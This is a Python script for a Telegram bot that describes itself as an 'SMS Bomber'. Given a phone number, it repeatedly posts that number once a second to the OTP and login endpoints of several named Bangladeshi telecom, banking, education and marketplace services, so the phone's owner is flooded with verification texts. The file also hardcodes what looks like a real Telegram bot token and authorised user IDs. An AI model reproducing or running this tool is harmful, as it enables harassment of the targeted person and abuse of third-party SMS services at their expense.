import requests
from telegram import Bot
from telegram.ext import Updater, CommandHandler, CallbackContext
import os
from flask import Flask
from threading import Thread

app = Flask(__name__)
@app.route('/')
def index():
    return "I'm ON"
def run():
    app.run(host='0.0.0.0', port=8080)
def keep_alive():
    t = Thread(target=run)
    t.start()
if __name__ == "__main__":
    keep_alive()



# Your API endpoints and other configurations
api_endpoints = [
    "https://weblogin.grameenphone.com/backend/api/v1/otp",
    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
    "https://fundesh.com.bd/api/auth/resendOTP",
    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    "https://api.shikho.com/auth/v2/send/sms",
    "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
    "https://themallbd.com/api/auth/otp_login",
    "https://bikroy.com/data/phone_number_login/verifications/phone_login",
]

bot_token = "6880465769:AAFdq32alIE7Z_iSlrbjGNDKhLyDxIwyPhg"
allowed_user_ids = [1915576406,6343969439]  # Replace with your authorized user IDs

bot = Bot(token=bot_token)
send_otp_flag = False
loop_counter = [0]

def start(update, context):
    update.message.reply_text("Welcome to the SMS Bomber bot! Please type /sendotp <phone_number> to continuously send OTPs.")

def send_otp(update, context):
    global send_otp_flag

    if update.effective_user.id not in allowed_user_ids:
        update.message.reply_text("You are not authorized to use this command.")
        return

    if context.args:
        phone_number = context.args[0]
        send_otp_flag = True
        loop_counter[0] = 0

        # Move the json_data definition inside the function
        json_data = {
            "https://weblogin.grameenphone.com/backend/api/v1/otp": {"msisdn": phone_number},
            "https://developer.quizgiri.xyz/api/v2.0/send-otp": {"country_code": "+880", "phone": phone_number},
            "https://fundesh.com.bd/api/auth/generateOTP?service_key=": {"msisdn": phone_number},
            "https://fundesh.com.bd/api/auth/resendOTP": {"msisdn": phone_number},
            "https://developer.quizgiri.xyz/api/v2.0/send-otp": {"phone": phone_number, "country_code": "+880", "fcm_token": None},
            "https://api.shikho.com/auth/v2/send/sms": {"phone": phone_number, "email": None, "auth_type": "login"},
            "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber": {
                "AccessToken": "",
                "TrackingNo": "",
                "mobileNo": phone_number,
                "otpSms": "",
                "product_id": "201",
                "requestChannel": "MOB",
                "trackingStatus": 5
            },
            "https://themallbd.com/api/auth/otp_login": {"phone_number": "+880" + phone_number},
            "https://bikroy.com/data/phone_number_login/verifications/phone_login": {},
        }

        def send_otp_job(context: CallbackContext):
            loop_counter[0] += 1

            for endpoint in api_endpoints:
                try:
                    response = requests.post(endpoint, json=json_data[endpoint])

                    if response.status_code == 200:
                        bot.send_message(chat_id=update.effective_chat.id, text=f"SMS sent to {phone_number} successfully.")
                    else:
                        bot.send_message(chat_id=update.effective_chat.id, text=f"Sending failed for {phone_number}.")

                except Exception as e:
                    bot.send_message(chat_id=update.effective_chat.id, text=f"Error requesting OTP from {endpoint}: {str(e)}")

            if context.args and loop_counter[0] >= int(context.args[1]):
                send_otp_flag = False
                context.job_queue.stop()
                update.message.reply_text(f"SMS OTP sending stopped after {loop_counter[0]} loops.")

        context.job_queue.run_repeating(send_otp_job, interval=1, first=0, context=update.message.chat_id)

    else:
        update.message.reply_text("Please provide a phone number and, optionally, the number of loops. Example: /sendotp 1234567890 5")

def stop_otp(update, context):
    global send_otp_flag
    send_otp_flag = False
    context.job_queue.stop()
    update.message.reply_text("Continuous OTP sending stopped.")

updater = Updater(bot=bot, use_context=True)
dispatcher = updater.dispatcher

start_handler = CommandHandler('start', start)
dispatcher.add_handler(start_handler)

send_otp_handler = CommandHandler('sendotp', send_otp, pass_args=True, pass_job_queue=True)
dispatcher.add_handler(send_otp_handler)

stop_otp_handler = CommandHandler('stopotp', stop_otp, pass_job_queue=True)
dispatcher.add_handler(stop_otp_handler)

updater.start_polling()
updater.idle()
